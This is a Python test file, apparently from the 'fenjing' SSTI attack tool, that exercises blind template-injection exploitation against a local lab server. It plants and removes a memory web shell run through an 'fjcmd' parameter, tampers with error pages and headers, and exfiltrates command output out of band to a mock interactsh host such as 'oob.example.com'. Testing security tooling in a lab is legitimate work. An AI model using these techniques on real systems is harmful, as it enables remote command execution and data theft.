# -*- coding: utf-8 -*-
"""无回显（盲）SSTI利用的端到端测试

启动tests/blind_server.py（127.0.0.1:8001），用BlindAttacker跑通
前4个可自动验证的步骤，每步独立确认canary真的出现在验证响应里，
并验证各步骤的还原/清理逻辑；另覆盖：
- blind子命令参数透传（mock run_blind）
- 验证请求复用requester的session（Cookie透传）
- 多worker场景下的重试验证
- 本地mock interactsh服务器的注册/轮询/OOB带外解码
"""
import base64
import hashlib
import json
import secrets
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).parent.parent))  # 优先使用本地源码而非全局安装版

import requests
from click.testing import CliRunner

BLIND_ADDR = "http://127.0.0.1:8001"
SERVER_PATH = Path(__file__).parent / "blind_server.py"


def wait_server(addr: str, timeout: float = 15) -> bool:
    """等待靶机启动"""
    start = time.time()
    while time.time() - start < timeout:
        try:
            requests.get(addr + "/", timeout=2)
            return True
        except requests.RequestException:
            time.sleep(0.3)
    return False


class TestBlind(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.proc = subprocess.Popen(
            [sys.executable, str(SERVER_PATH)],
            cwd=str(SERVER_PATH.parent),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        if not wait_server(BLIND_ADDR):
            cls.proc.kill()
            raise RuntimeError("blind_server start failed")

    @classmethod
    def tearDownClass(cls):
        cls.proc.kill()
        cls.proc.wait()

    def setUp(self):
        from fenjing.blind import BlindAttacker
        from fenjing.form import get_form
        from fenjing.requester import HTTPRequester
        from fenjing.submitter import FormSubmitter

        # 靶机无回显，WAF探测会失败，这里直接用原始payload路径
        form = get_form(action="/", method="POST", inputs=["code"])
        requester = HTTPRequester(interval=0)
        submitter = FormSubmitter(BLIND_ADDR + "/", form, "code", requester)
        self.requester = requester
        self.attacker = BlindAttacker(BLIND_ADDR + "/", submitter, None)

    # ---------------- 四步利用 + 清理/还原 ----------------

    def test_step1_write_static(self):
        self.assertTrue(self.attacker.step_write_static())
        # 验证成功后canary文件应已被自动删除
        resp = requests.get(self.attacker.static_file_url, timeout=5)
        self.assertEqual(resp.status_code, 404, "canary文件未被清理")
        self.assertEqual(self.attacker.results["steps"]["write_static"]["canary"],
                         self.attacker.last_canary)
        print(f"\n[step1] wrote & cleaned {self.attacker.static_file_url}")

    def test_step2_memory_shell_and_unhook(self):
        self.assertTrue(self.attacker.step_memory_shell())
        # 独立验证：用另一个canary执行命令（POST body方式）
        resp = requests.post(
            BLIND_ADDR + "/", data={"fjcmd": "echo fj_memshell_check"}, timeout=5
        )
        self.assertIn("fj_memshell_check", resp.text)
        # 卸载后fjcmd应失效
        self.assertTrue(self.attacker.unhook_memshell())
        resp = requests.get(
            BLIND_ADDR + "/", params={"fjcmd": "echo fj_memshell_check"}, timeout=5
        )
        self.assertNotIn("fj_memshell_check", resp.text)
        print("\n[step2] memory shell works and unhooked")

    def test_step3_error_page_and_restore(self):
        self.assertTrue(self.attacker.step_error_page())
        # 独立验证：404页面包含canary
        resp = requests.get(BLIND_ADDR + "/no_such_page_at_all", timeout=5)
        self.assertIn(self.attacker.last_canary, resp.text)
        # 还原后404页面恢复原description
        self.assertTrue(self.attacker.restore_error_page())
        resp = requests.get(BLIND_ADDR + "/another_no_such_page", timeout=5)
        self.assertNotIn(self.attacker.last_canary, resp.text)
        self.assertIn("The requested URL was not found", resp.text)
        print("\n[step3] error page polluted and restored")

    def test_step4_server_header_and_restore(self):
        self.assertTrue(self.attacker.step_server_header())
        # 独立验证：Server头包含canary
        resp = requests.get(BLIND_ADDR + "/", timeout=5)
        self.assertIn(self.attacker.last_canary, resp.headers.get("Server", ""))
        # 还原后Server头恢复Werkzeug字样
        self.assertTrue(self.attacker.restore_server_header())
        resp = requests.get(BLIND_ADDR + "/", timeout=5)
        self.assertNotIn(self.attacker.last_canary, resp.headers.get("Server", ""))
        self.assertIn("Werkzeug", resp.headers.get("Server", ""))
        print("\n[step4] Server header polluted and restored")

    # ---------------- session复用 ----------------

    def test_session_reuse_cookie(self):
        """带Cookie的requester构造的BlindAttacker，验证请求也应携带Cookie"""
        from fenjing.blind import BlindAttacker
        from fenjing.form import get_form
        from fenjing.requester import HTTPRequester
        from fenjing.submitter import FormSubmitter

        requester = HTTPRequester(interval=0, headers={"Cookie": "fjtest=secret123"})
        form = get_form(action="/", method="POST", inputs=["code"])
        submitter = FormSubmitter(BLIND_ADDR + "/", form, "code", requester)
        attacker = BlindAttacker(BLIND_ADDR + "/", submitter, None)
        resp = attacker.http_get(BLIND_ADDR + "/echo_cookie")
        self.assertIsNotNone(resp)
        self.assertIn("fjtest=secret123", resp.text)
        # 带Cookie走完整第1步也应成功
        self.assertTrue(attacker.step_write_static())
        print("\n[session] verify requests carry cookie")

    # ---------------- 多worker重试 ----------------

    def test_verify_loop_retries(self):
        """验证函数前几次失败、后面成功时，verify_loop应重试到成功为止"""
        self.attacker.verify_times = 3
        calls = []

        def check():
            calls.append(1)
            return len(calls) >= 3

        self.assertTrue(self.attacker.verify_loop(check, "test"))
        self.assertEqual(len(calls), 3)
        self.assertFalse(self.attacker.verify_loop(lambda: False, "test"))

    def test_memshell_multiworker_retry(self):
        """模拟多worker目标：前几次验证请求命中无马worker，重试后应成功"""
        real_http_get = self.attacker.http_get
        state = {"miss": 2}

        def flaky_get(url, params=None):
            if params and "fjcmd" in params and state["miss"] > 0:
                state["miss"] -= 1
                return real_http_get(url)  # 命中无马worker：返回正常页面
            return real_http_get(url, params)

        with mock.patch.object(self.attacker, "http_get", flaky_get):
            self.assertTrue(self.attacker.step_memory_shell())
        self.assertEqual(state["miss"], 0)
        self.attacker.unhook_memshell()
        print("\n[multiworker] retried verification passed")

    # ---------------- blind子命令参数透传 ----------------

    def test_blind_cli_passthrough(self):
        """fenjing blind的参数（Cookie/Header/Proxy/OOB/输出等）应透传到run_blind"""
        from fenjing import cli as cli_module

        captured = {}

        def fake_run_blind(**kwargs):
            captured.update(kwargs)
            return "write_static"

        runner = CliRunner()
        with mock.patch("fenjing.blind.run_blind", fake_run_blind):
            result = runner.invoke(
                cli_module.main,
                [
                    "blind",
                    "-u", "http://127.0.0.1:8001/",
                    "-i", "code",
                    "--cookies", "session=abc",
                    "--header", "X-Token: t1",
                    "--proxy", "http://127.0.0.1:9999",
                    "--oob-server", "oob.example.com",
                    "--oob-cmd", "id",
                    "--static-path", "/app/static",
                    "--output", "out.json",
                    "--no-interactive",
                    "--no-verify-ssl",
                ],
            )
        self.assertEqual(result.exit_code, 0, result.output)
        self.assertEqual(captured["oob_server"], "oob.example.com")
        self.assertEqual(captured["oob_cmd"], "id")
        self.assertEqual(captured["static_path"], "/app/static")
        self.assertEqual(captured["output"], "out.json")
        self.assertFalse(captured["interactive"])
        # 未传--no-oob时OOB步骤应保持开启（传了--oob-server更需要）
        self.assertTrue(captured["do_oob"])
        requester = captured["requester"]
        self.assertEqual(requester.session.headers.get("Cookie"), "session=abc")
        self.assertEqual(requester.session.headers.get("X-token"), "t1")
        self.assertEqual(
            requester.session.proxies.get("http"), "http://127.0.0.1:9999"
        )
        self.assertFalse(requester.session.verify)
        print("\n[cli] blind子命令参数透传正确")

    def test_blind_cli_in_help(self):
        """--help中应出现blind子命令"""
        from fenjing import cli as cli_module

        runner = CliRunner()
        result = runner.invoke(cli_module.main, ["--help"])
        self.assertEqual(result.exit_code, 0)
        self.assertIn("blind", result.output)


# ---------------- mock interactsh服务器 ----------------


def _der_read(data: bytes, pos: int):
    """极简DER TLV读取，返回(tag, content, next_pos)"""
    tag = data[pos]
    pos += 1
    length = data[pos]
    pos += 1
    if length & 0x80:
        nbytes = length & 0x7F
        length = int.from_bytes(data[pos : pos + nbytes], "big")
        pos += nbytes
    return tag, data[pos : pos + length], pos + length


def parse_pubkey_pem_b64(b64pem: str):
    """从/register提交的base64(PEM)中解析出RSA公钥(n, e)"""
    pem = base64.b64decode(b64pem).decode()
    inner = "".join(
        line for line in pem.splitlines() if not line.startswith("-----")
    )
    der = base64.b64decode(inner)
    _, spki, _ = _der_read(der, 0)
    _, _, pos = _der_read(spki, 0)  # AlgorithmIdentifier
    _, bitstr, _ = _der_read(spki, pos)  # BIT STRING
    _, rsa_seq, _ = _der_read(bitstr[1:], 0)
    _, n_bytes, pos = _der_read(rsa_seq, 0)
    _, e_bytes, _ = _der_read(rsa_seq, pos)
    return int.from_bytes(n_bytes, "big"), int.from_bytes(e_bytes, "big")


def oaep_encrypt(n: int, e: int, msg: bytes) -> bytes:
    """RSA OAEP(SHA-256)加密，mock服务器用客户端公钥加密aes_key"""
    from fenjing.interactsh import _mgf1

    k = (n.bit_length() + 7) // 8
    hlen = 32
    seed = secrets.token_bytes(hlen)
    lhash = hashlib.sha256(b"").digest()
    db = lhash + b"\x00" * (k - len(msg) - 2 * hlen - 2) + b"\x01" + msg
    masked_db = bytes(a ^ b for a, b in zip(db, _mgf1(seed, k - 1 - hlen)))
    masked_seed = bytes(a ^ b for a, b in zip(seed, _mgf1(masked_db, hlen)))
    em = b"\x00" + masked_seed + masked_db
    return pow(int.from_bytes(em, "big"), e, n).to_bytes(k, "big")


class MockInteractshHandler(BaseHTTPRequestHandler):
    """模拟self-hosted interactsh服务器：/register /poll /deregister，
    其他GET路径视为目标的OOB回调并记录"""

    pubkey = None  # (n, e)
    recorded_paths = []

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length) or b"{}")
        if self.path == "/register":
            type(self).pubkey = parse_pubkey_pem_b64(body["public-key"])
            self._json({"message": "registration successful"})
        elif self.path == "/deregister":
            self._json({"message": "success"})
        else:
            self.send_error(404)

    def do_GET(self):  # noqa: N802
        if self.path.startswith("/poll"):
            paths = type(self).recorded_paths
            if paths and type(self).pubkey:
                from fenjing.interactsh import aes_ctr_crypt

                raw_request = f"GET {paths[-1]} HTTP/1.1\r\nHost: x\r\n\r\n"
                interaction = json.dumps({
                    "protocol": "http",
                    "unique-id": "mock",
                    "full-id": "mock",
                    "raw-request": raw_request,
                    "remote-address": "127.0.0.1",
                    "timestamp": "2026-01-01T00:00:00Z",
                }).encode()
                aes_key = secrets.token_bytes(32)
                iv = secrets.token_bytes(16)
                enc_data = base64.b64encode(
                    iv + aes_ctr_crypt(aes_key, iv, interaction)
                ).decode()
                n, e = type(self).pubkey
                enc_key = base64.b64encode(oaep_encrypt(n, e, aes_key)).decode()
                self._json({"data": [enc_data], "aes_key": enc_key})
            else:
                self._json({"data": [], "aes_key": ""})
        else:
            # 目标OOB回调打到这里
            type(self).recorded_paths.append(self.path)
            self._json({})

    def log_message(self, *args):
        pass


class TestInteractsh(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.httpd = ThreadingHTTPServer(("127.0.0.1", 0), MockInteractshHandler)
        cls.port = cls.httpd.server_address[1]
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()
        # 起一个无回显靶机
        cls.proc = subprocess.Popen(
            [sys.executable, str(SERVER_PATH)],
            cwd=str(SERVER_PATH.parent),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        if not wait_server(BLIND_ADDR):
            cls.proc.kill()
            raise RuntimeError("blind_server start failed")

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.proc.kill()
        cls.proc.wait()

    def setUp(self):
        MockInteractshHandler.pubkey = None
        MockInteractshHandler.recorded_paths = []

    def test_register_poll_roundtrip(self):
        """interactsh注册/轮询/注销全流程（mock服务器）"""
        from fenjing.interactsh import InteractshClient

        client = InteractshClient(f"127.0.0.1:{self.port}")
        domain = client.register()
        self.assertTrue(domain.endswith(f"127.0.0.1:{self.port}"))
        self.assertIsNotNone(MockInteractshHandler.pubkey)
        # 模拟目标回调
        requests.get(f"http://127.0.0.1:{self.port}/dGVzdA==", timeout=5)
        interactions = client.poll()
        self.assertEqual(len(interactions), 1)
        self.assertEqual(interactions[0]["protocol"], "http")
        self.assertIn("/dGVzdA==", interactions[0]["raw-request"])
        self.assertTrue(client.deregister())
        print("\n[interactsh] register/poll/deregister roundtrip OK")

    def test_step_oob_with_mock(self):
        """step_oob对接mock interactsh：payload让靶机回调，轮询确认并解码数据"""
        from fenjing.blind import BlindAttacker
        from fenjing.form import get_form
        from fenjing.interactsh import InteractshClient
        from fenjing.requester import HTTPRequester
        from fenjing.submitter import FormSubmitter

        attacker_cls = self

        class LocalClient(InteractshClient):
            """本地mock没有DNS泛解析，payload直接打mock服务器地址"""

            def register(self):
                super().register()
                return f"127.0.0.1:{attacker_cls.port}"

        form = get_form(action="/", method="POST", inputs=["code"])
        requester = HTTPRequester(interval=0)
        submitter = FormSubmitter(BLIND_ADDR + "/", form, "code", requester)
        attacker = BlindAttacker(BLIND_ADDR + "/", submitter, None)
        with mock.patch("fenjing.interactsh.InteractshClient", LocalClient):
            ok = attacker.step_oob(
                oob_server=f"127.0.0.1:{self.port}",
                oob_cmd="echo FJOOBTESTMARK",
                oob_timeout=10,
            )
        self.assertTrue(ok)
        self.assertIn("FJOOBTESTMARK", attacker.results["oob"]["exfiltrated"])
        print("\n[oob] exfiltrated:", attacker.results["oob"]["exfiltrated"])

    def test_result_output_json(self):
        """--output应把结构化结果写成JSON"""
        from fenjing.blind import BlindAttacker
        from fenjing.form import get_form
        from fenjing.requester import HTTPRequester
        from fenjing.submitter import FormSubmitter

        form = get_form(action="/", method="POST", inputs=["code"])
        requester = HTTPRequester(interval=0)
        submitter = FormSubmitter(BLIND_ADDR + "/", form, "code", requester)
        attacker = BlindAttacker(BLIND_ADDR + "/", submitter, None)
        self.assertTrue(attacker.step_write_static())
        attacker.results["success_step"] = "write_static"
        with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False, encoding="utf-8"
        ) as f:
            out_path = f.name
        try:
            Path(out_path).write_text(
                json.dumps(attacker.results, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
            loaded = json.loads(Path(out_path).read_text(encoding="utf-8"))
            self.assertEqual(loaded["success_step"], "write_static")
            self.assertTrue(loaded["static_file_url"].endswith(".txt"))
            self.assertTrue(loaded["canary"].startswith("FJ"))
        finally:
            Path(out_path).unlink(missing_ok=True)
        print("\n[output] result json OK")


if __name__ == "__main__":
    unittest.main()
